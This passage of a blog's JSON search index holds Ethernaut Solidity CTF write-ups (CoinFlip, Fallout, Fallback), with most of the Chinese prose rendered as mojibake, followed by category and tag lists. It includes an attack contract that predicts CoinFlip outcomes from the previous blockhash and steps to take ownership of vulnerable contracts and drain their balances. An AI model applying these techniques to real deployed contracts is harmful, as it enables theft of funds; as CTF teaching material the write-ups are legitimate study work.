æŸ¥çœ‹åŸæ‹¥æœ‰ç€ï¼Œå¹¶è°ƒç”¨æ”»å‡»åˆçº¦ä¸­é¢exploit() å‡½æ•° 3.4 æäº¤å®ä¾‹å¹¶æŸ¥çœ‹ç»“æœ 3.5 æˆåŠŸï¼ï¼ï¼ï¼","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"CoinFlip","slug":"CTFS/ethernaut/CoinFlip","date":"2023-01-08T02:12:10.000Z","updated":"2023-01-08T02:12:10.000Z","comments":true,"path":"2023/01/08/CTFS/ethernaut/CoinFlip/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/08/CTFS/ethernaut/CoinFlip/","excerpt":"","text":"CoinFilp1. é¢˜ç›®è¦æ±‚è¿™æ˜¯ä¸€ä¸ªæ·ç¡¬å¸çš„æ¸¸æˆï¼Œä½ éœ€è¦è¿ç»­çš„çŒœå¯¹ç»“æœã€‚ å®Œæˆè¿™ä¸€å…³ï¼Œä½ éœ€è¦é€šè¿‡ä½ çš„è¶…èƒ½åŠ›æ¥è¿ç»­çŒœå¯¹åæ¬¡ã€‚ 2. åˆ†æ2.1 tipsï¼š å‚è€ƒè§†é¢‘ 2.2 _guess = uint256(blockhash(block.number.sub(1))).div(FACTOR) == 1 ? true : false2ï¼‰æˆ‘ä»¬çŸ¥é“ä¸èƒ½flip()åœ¨åŒä¸€ä¸ªå—ä¸­è°ƒç”¨å¤šæ¬¡ï¼›å¦åˆ™è¯¥åŠŸèƒ½å°†æ¢å¤ã€‚è¿™æ„å‘³ç€è¦é€šè¿‡æŒ‘æˆ˜ï¼Œæˆ‘ä»¬è‡³å°‘éœ€è¦çŒœå¯¹ 11 ä¸ªåŒºå— 2.3 æ”»å‡»åˆçº¦ï¼š 123456789101112131415161718192021contract Hack &#123; CoinFlip private immutable target; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor (address _target) &#123; target = CoinFlip(_target); &#125; function flip() external &#123; bool guess = _guess(); require(target.flip(guess),&quot;guess failed&quot;); &#125; function _guess() private view returns(bool) &#123; uint256 blockValue = uint256(blockhash(block.number - 1)); uint256 coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ? true : false; return side; &#125;&#125; 2.3 è°ƒç”¨ 10æ¬¡ æ”»å‡»åˆçº¦çš„ flip() å‡½æ•° æ¥æ”¹å˜ CoinFilp åˆçº¦ä¸­ consecutiveWins çš„å€¼ 3. è§£é¢˜ 3.1 è·å–å…³å¡çš„å®ä¾‹ï¼š0x2F3D37ae048f36c8B2674aB1a4B8D3Bab4B6B716 3.2 åœ¨remixä¸­è°ƒç”¨å…³å¡åˆçº¦ 3.3 éƒ¨ç½²æ”»å‡»åˆçº¦ 3.5 è°ƒç”¨ 11æ¬¡ åˆçº¦ä¸­filp() å‡½æ•° 3.6 æäº¤å®ä¾‹å¹¶æŸ¥çœ‹ç»“æœ æˆåŠŸï¼ï¼ï¼","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Fallout","slug":"CTFS/ethernaut/Fallout","date":"2023-01-08T01:47:10.000Z","updated":"2023-01-08T01:47:10.000Z","comments":true,"path":"2023/01/08/CTFS/ethernaut/Fallout/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/08/CTFS/ethernaut/Fallout/","excerpt":"","text":"Fallout1.é¢˜ç›®è¦æ±‚è·å¾—ä»¥ä¸‹åˆçº¦çš„æ‰€æœ‰æƒæ¥å®Œæˆè¿™ä¸€å…³ 12345678910111213141516171819202122232425262728293031323334353637383940414243// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;;contract Fallout &#123; using SafeMath for uint256; mapping (address =&gt; uint) allocations; address payable public owner; /* constructor */ function Fal1out() public payable &#123; owner = msg.sender; allocations[owner] = msg.value; &#125; modifier onlyOwner &#123; require( msg.sender == owner, &quot;caller is not the owner&quot; ); _; &#125; function allocate() public payable &#123; allocations[msg.sender] = allocations[msg.sender].add(msg.value); &#125; function sendAllocation(address payable allocator) public &#123; require(allocations[allocator] &gt; 0); allocator.transfer(allocations[allocator]); &#125; function collectAllocations() public onlyOwner &#123; msg.sender.transfer(address(this).balance); &#125; function allocatorBalance(address allocator) public view returns (uint) &#123; return allocations[allocator]; &#125;&#125; 2. åˆ†æ import &#39;openzeppelin-contracts-06/math/SafeMath.sol&#39;; 2.1 ç”±äºæ²¡æœ‰SafeMath.solæ–‡ä»¶åœ¨remixä¸­ï¼Œæ‰€ä»¥å¯ä»¥åœ¨remixä¸­å»ºç›¸åŒè·¯å¾„çš„æ–‡ä»¶å¤¹ 2.2 é˜…è¯»ä»£ç å¯çŸ¥ï¼Œåœ¨fal1out() å‡½æ•°ä¸­å¯ä»¥ä¿®æ”¹åˆçº¦çš„æ‰€æœ‰æƒï¼Œå³æˆåŠŸè°ƒç”¨fal1out()å‡½æ•°å³å¯ 3. è§£é¢˜ 3.1 è·å–å…³å¡å®ä¾‹åœ°å€ï¼š 0x578d3Fca5950E9CB155B91002FAe154796D05217 3.2 è°ƒç”¨å…³å¡åˆçº¦ 3.3 3.4 æŸ¥çœ‹åŸåˆçº¦æ‹¥æœ‰è€… 3.5 è°ƒç”¨Fal1out() å‡½æ•°ä¹‹åï¼Œå†æ¬¡æŸ¥çœ‹åˆçº¦çš„owner 3.6 æäº¤å®ä¾‹å¹¶æŸ¥çœ‹ç»“æœ æˆåŠŸï¼ï¼ï¼ï¼","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Fallback","slug":"CTFS/ethernaut/Fallback","date":"2023-01-07T08:47:10.000Z","updated":"2023-01-07T08:47:10.000Z","comments":true,"path":"2023/01/07/CTFS/ethernaut/Fallback/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/07/CTFS/ethernaut/Fallback/","excerpt":"","text":"Fallbacké¢˜è§£1. é¢˜ç›®è¦æ±‚â‘  è·å¾—è¿™ä¸ªåˆçº¦çš„æ‰€æœ‰æƒ â‘¡ æŠŠå®ƒçš„åˆçº¦ä½™é¢å‡åˆ°0 æç¤ºï¼š å¦‚ä½•é€šè¿‡ä¸ABIäº’åŠ¨å‘é€ether å¦‚ä½•åœ¨ABIä¹‹å¤–å‘é€ether è½¬æ¢ wei&#x2F;ether å•ä½ (å‚è§ help() å‘½ä»¤) Fallback æ–¹æ³• åˆçº¦ä»£ç ï¼š123456789101112131415161718192021222324252627282930313233343536373839404142// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Fallback &#123; mapping(address =&gt; uint) public contributions; address public owner; constructor() &#123; owner = msg.sender; contributions[msg.sender] = 1000 * (1 ether); &#125; modifier onlyOwner &#123; require( msg.sender == owner, &quot;caller is not the owner&quot; ); _; &#125; function contribute() public payable &#123; require(msg.value &lt; 0.001 ether); contributions[msg.sender] += msg.value; if(contributions[msg.sender] &gt; contributions[owner]) &#123; owner = msg.sender; &#125; &#125; function getContribution() public view returns (uint) &#123; return contributions[msg.sender]; &#125; function withdraw() public onlyOwner &#123; payable(owner).transfer(address(this).balance); &#125; receive() external payable &#123; require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0); owner = msg.sender; &#125;&#125; 2. åˆ†æ 2.1 è¯¥é¢˜çš„é¢˜çœ¼åœ¨äºï¼Œé€šè¿‡owner &#x3D; msg.senderè¯­å¥æŠŠåˆçº¦çš„æ‰€æœ‰æƒè®¾ç½®ä¸ºåˆçº¦è°ƒç”¨è€…ï¼Œè§‚å¯Ÿåˆ†æåˆçº¦å¯çŸ¥ï¼Œåœ¨contribute()æ–¹æ³•å’Œ receive() æ–¹æ³•ä¸­æ‹¥æœ‰è¯¥è¯­å¥ï¼Œä½†å¦‚æœæ‰§è¡Œcontribute() çš„è¯éœ€è¦è°ƒç”¨ 0.001 * 1000000 + 1æ¬¡ æ˜¾ç„¶è¿™æ ·çš„ä½œæ³•æ˜¯ä¸å¯å–çš„ï¼Œæ•… åªèƒ½é‡‡ç”¨receive()æ–¹æ³•æ¥å®ç° 2.2 receive()æˆåŠŸè°ƒç”¨çš„æ¡ä»¶æ˜¯ï¼Œè°ƒç”¨è€…çš„è´¡çŒ®å€¼å¤§äº0.001ether è¿˜ç”¨æ”¯ä»˜ &gt; 0çš„è´¹ç”¨ï¼Œæˆ‘ä»¬åªèƒ½é€šè¿‡è°ƒç”¨contribute()å‡½æ•°æ”¹å˜åˆçº¦è°ƒç”¨è€…çš„è´¡çŒ®å€¼ï¼Œæ”¹å¥½ä¹‹åå°±å¯ä»¥è°ƒç”¨åˆ°åˆçº¦çš„receive()å‡½æ•°ï¼Œå°±å¯ä»¥æˆä¸ºåˆçº¦çš„æ‹¥æœ‰è€… 2.3 æœ€åè°ƒç”¨withdraw() å‡½æ•°å°†åˆçº¦çš„é’±å…¨éƒ¨è½¬ç»™owner å³ï¼š 3.è§£é¢˜ 3.1 å…ˆä»é¢˜ç›®ä¸­è·å–å…³å¡çš„åœ°å€ï¼š 3.2 åˆ°remixä¸­ï¼Œå°†ç½‘ç»œå’Œè´¦æˆ·åˆ‡æ¢ä¸ºè‡ªå·±çš„é’±åŒ…è´¦æˆ·ï¼Œ 3.3 ç»™è‡ªå·±çš„é’±åŒ…è´¦æˆ·åŠ å…¥è´¡çŒ®å€¼ contributions 3.4 è°ƒç”¨receive() å‡½æ•°ï¼Œå®ç°è·å– åˆçº¦æ‰€æœ‰æƒæ“ä½œ 3.5 æŸ¥çœ‹å½“å‰åˆçº¦çš„owner 3.6 æœ€åè°ƒç”¨withdraw() å‡½æ•°ï¼Œå°†åˆçº¦çš„ä½™é¢å…¨éƒ¨è½¬å‡º 3.7 å›åˆ°é¢˜ç›®æäº¤å®ä¾‹ 3.8 è¿”å›ç»“æœï¼Œé€šè¿‡ï¼ï¼ï¼ï¼š","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]}],"categories":[{"name":"Basic_Knowledge","slug":"Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/"},{"name":"Solidity","slug":"Basic-Knowledge/Solidity","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/Solidity/"},{"name":"DEFI","slug":"DEFI","permalink":"https://biyouqiuqiu.com/categories/DEFI/"},{"name":"ERC","slug":"DEFI/ERC","permalink":"https://biyouqiuqiu.com/categories/DEFI/ERC/"},{"name":"proxy","slug":"DEFI/proxy","permalink":"https://biyouqiuqiu.com/categories/DEFI/proxy/"},{"name":"Utils","slug":"Utils","permalink":"https://biyouqiuqiu.com/categories/Utils/"},{"name":"Solidity","slug":"Utils/Solidity","permalink":"https://biyouqiuqiu.com/categories/Utils/Solidity/"},{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"Paradigm-CTF-2022","slug":"CTFS/Paradigm-CTF-2022","permalink":"https://biyouqiuqiu.com/categories/CTFS/Paradigm-CTF-2022/"},{"name":"Paradigm-CTF-2021","slug":"CTFS/Paradigm-CTF-2021","permalink":"https://biyouqiuqiu.com/categories/CTFS/Paradigm-CTF-2021/"},{"name":"Experience","slug":"Experience","permalink":"https://biyouqiuqiu.com/categories/Experience/"},{"name":"tips","slug":"Experience/tips","permalink":"https://biyouqiuqiu.com/categories/Experience/tips/"},{"name":"CBSC-2022","slug":"CTFS/CBSC-2022","permalink":"https://biyouqiuqiu.com/categories/CTFS/CBSC-2022/"},{"name":"MetaTrust CTF","slug":"CTFS/MetaTrust-CTF","permalink":"https://biyouqiuqiu.com/categories/CTFS/MetaTrust-CTF/"},{"name":"Mr Steal Yo Crypto","slug":"CTFS/Mr-Steal-Yo-Crypto","permalink":"https://biyouqiuqiu.com/categories/CTFS/Mr-Steal-Yo-Crypto/"},{"name":"foundry","slug":"Utils/foundry","permalink":"https://biyouqiuqiu.com/categories/Utils/foundry/"},{"name":"CTFProtocol","slug":"CTFS/CTFProtocol","permalink":"https://biyouqiuqiu.com/categories/CTFS/CTFProtocol/"},{"name":"ChainFlag","slug":"CTFS/ChainFlag","permalink":"https://biyouqiuqiu.com/categories/CTFS/ChainFlag/"},{"name":"EVM Puzzles","slug":"CTFS/EVM-Puzzles","permalink":"https://biyouqiuqiu.com/categories/CTFS/EVM-Puzzles/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"},{"name":"damn defi","slug":"CTFS/damn-defi","permalink":"https://biyouqiuqiu.com/categories/CTFS/damn-defi/"},{"name":"proxy","slug":"Basic-Knowledge/proxy","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/proxy/"},{"name":"gnosis","slug":"DEFI/gnosis","permalink":"https://biyouqiuqiu.com/categories/DEFI/gnosis/"},{"name":"Proxy","slug":"DEFI/Proxy","permalink":"https://biyouqiuqiu.com/categories/DEFI/Proxy/"},{"name":"uniswap","slug":"DEFI/uniswap","permalink":"https://biyouqiuqiu.com/categories/DEFI/uniswap/"},{"name":"hardhat","slug":"Utils/hardhat","permalink":"https://biyouqiuqiu.com/categories/Utils/hardhat/"},{"name":"Ethersjs","slug":"Utils/Ethersjs","permalink":"https://biyouqiuqiu.com/categories/Utils/Ethersjs/"},{"name":"Ethers.js","slug":"Utils/Ethers-js","permalink":"https://biyouqiuqiu.com/categories/Utils/Ethers-js/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"},{"name":"Web3","slug":"Utils/Web3","permalink":"https://biyouqiuqiu.com/categories/Utils/Web3/"}],"tags":[{"name":"çŸ¥è¯†æ‰«ç›²","slug":"çŸ¥è¯†æ‰«ç›²","permalink":"https://biyouqiuqiu.com/tags/%E7%9F%A5%E8%AF%86%E6%89%AB%E7%9B%B2/"},{"name":"ERC","slug":"ERC","permalink":"https://biyouqiuqiu.com/tags/ERC/"},{"name":"ERC1967","slug":"ERC1967","permalink":"https://biyouqiuqiu.com/tags/ERC1967/"},{"name":"ERC1167","slug":"ERC1167","permalink":"https://biyouqiuqiu.com/tags/ERC1167/"},{"name":"Upgradeable","slug":"Upgradeable","permalink":"https://biyouqiuqiu.com/tags/Upgradeable/"},{"name":"signature","slug":"signature","permalink":"https://biyouqiuqiu.com/tags/signature/"},{"name":"ERC4626","slug":"ERC4626","permalink":"https://biyouqiuqiu.com/tags/ERC4626/"},{"name":"ERC1155","slug":"ERC1155","permalink":"https://biyouqiuqiu.com/tags/ERC1155/"},{"name":"ERC777","slug":"ERC777","permalink":"https://biyouqiuqiu.com/tags/ERC777/"},{"name":"ERC1820","slug":"ERC1820","permalink":"https://biyouqiuqiu.com/tags/ERC1820/"},{"name":"ERC721","slug":"ERC721","permalink":"https://biyouqiuqiu.com/tags/ERC721/"},{"name":"ERC173","slug":"ERC173","permalink":"https://biyouqiuqiu.com/tags/ERC173/"},{"name":"ERC191","slug":"ERC191","permalink":"https://biyouqiuqiu.com/tags/ERC191/"},{"name":"ERC601","slug":"ERC601","permalink":"https://biyouqiuqiu.com/tags/ERC601/"},{"name":"ERC165","slug":"ERC165","permalink":"https://biyouqiuqiu.com/tags/ERC165/"},{"name":"ERC20","slug":"ERC20","permalink":"https://biyouqiuqiu.com/tags/ERC20/"},{"name":"Experience","slug":"Experience","permalink":"https://biyouqiuqiu.com/tags/Experience/"},{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"},{"name":"tips","slug":"tips","permalink":"https://biyouqiuqiu.com/tags/tips/"},{"name":"using","slug":"using","permalink":"https://biyouqiuqiu.com/tags/using/"},{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/tags/CTFS/"},{"name":"foundry","slug":"foundry","permalink":"https://biyouqiuqiu.com/tags/foundry/"},{"name":"solidity","slug":"solidity","permalink":"https://biyouqiuqiu.com/tags/solidity/"},{"name":"create2","slug":"create2","permalink":"https://biyouqiuqiu.com/tags/create2/"},{"name":"EVM_Puzzles","slug":"EVM-Puzzles","permalink":"https://biyouqiuqiu.com/tags/EVM-Puzzles/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"åŸºç¡€æ¼æ´","slug":"åŸºç¡€æ¼æ´","permalink":"https://biyouqiuqiu.com/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"},{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"Proxy","slug":"Proxy","permalink":"https://biyouqiuqiu.com/tags/Proxy/"},{"name":"gnosis","slug":"gnosis","permalink":"https://biyouqiuqiu.com/tags/gnosis/"},{"name":"proxiy","slug":"proxiy","permalink":"https://biyouqiuqiu.com/tags/proxiy/"},{"name":"å†…è”æ±‡ç¼–","slug":"å†…è”æ±‡ç¼–","permalink":"https://biyouqiuqiu.com/tags/%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96/"},{"name":"Timelock","slug":"Timelock","permalink":"https://biyouqiuqiu.com/tags/Timelock/"},{"name":"Transparent","slug":"Transparent","permalink":"https://biyouqiuqiu.com/tags/Transparent/"},{"name":"uniswap v2","slug":"uniswap-v2","permalink":"https://biyouqiuqiu.com/tags/uniswap-v2/"},{"name":"PrivateKey","slug":"PrivateKey","permalink":"https://biyouqiuqiu.com/tags/PrivateKey/"},{"name":"ASCII","slug":"ASCII","permalink":"https://biyouqiuqiu.com/tags/ASCII/"},{"name":"hardhat","slug":"hardhat","permalink":"https://biyouqiuqiu.com/tags/hardhat/"},{"name":"encode","slug":"encode","permalink":"https://biyouqiuqiu.com/tags/encode/"},{"name":"encodePacked","slug":"encodePacked","permalink":"https://biyouqiuqiu.com/tags/encodePacked/"},{"name":"privake key","slug":"privake-key","permalink":"https://biyouqiuqiu.com/tags/privake-key/"},{"name":"ethereumjs","slug":"ethereumjs","permalink":"https://biyouqiuqiu.com/tags/ethereumjs/"},{"name":"abi.encode","slug":"abi-encode","permalink":"https://biyouqiuqiu.com/tags/abi-encode/"},{"name":"abi.encodePacked","slug":"abi-encodePacked","permalink":"https://biyouqiuqiu.com/tags/abi-encodePacked/"},{"name":"solidityKeccak256","slug":"solidityKeccak256","permalink":"https://biyouqiuqiu.com/tags/solidityKeccak256/"},{"name":"abiCoder.encode","slug":"abiCoder-encode","permalink":"https://biyouqiuqiu.com/tags/abiCoder-encode/"},{"name":"hash","slug":"hash","permalink":"https://biyouqiuqiu.com/tags/hash/"},{"name":"ethers.js","slug":"ethers-js","permalink":"https://biyouqiuqiu.com/tags/ethers-js/"},{"name":"Web3","slug":"Web3","permalink":"https://biyouqiuqiu.com/tags/Web3/"},{"name":"å­¦ä¹ æ€»ç»“","slug":"å­¦ä¹ æ€»ç»“","permalink":"https://biyouqiuqiu.com/tags/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"},{"name":"Remix-debug","slug":"Remix-debug","permalink":"https://biyouqiuqiu.com/tags/Remix-debug/"},{"name":"éªŒè¯ç­¾å","slug":"éªŒè¯ç­¾å","permalink":"https://biyouqiuqiu.com/tags/%E9%AA%8C%E8%AF%81%E7%AD%BE%E5%90%8D/"},{"name":"ecrecover","slug":"ecrecover","permalink":"https://biyouqiuqiu.com/tags/ecrecover/"}]}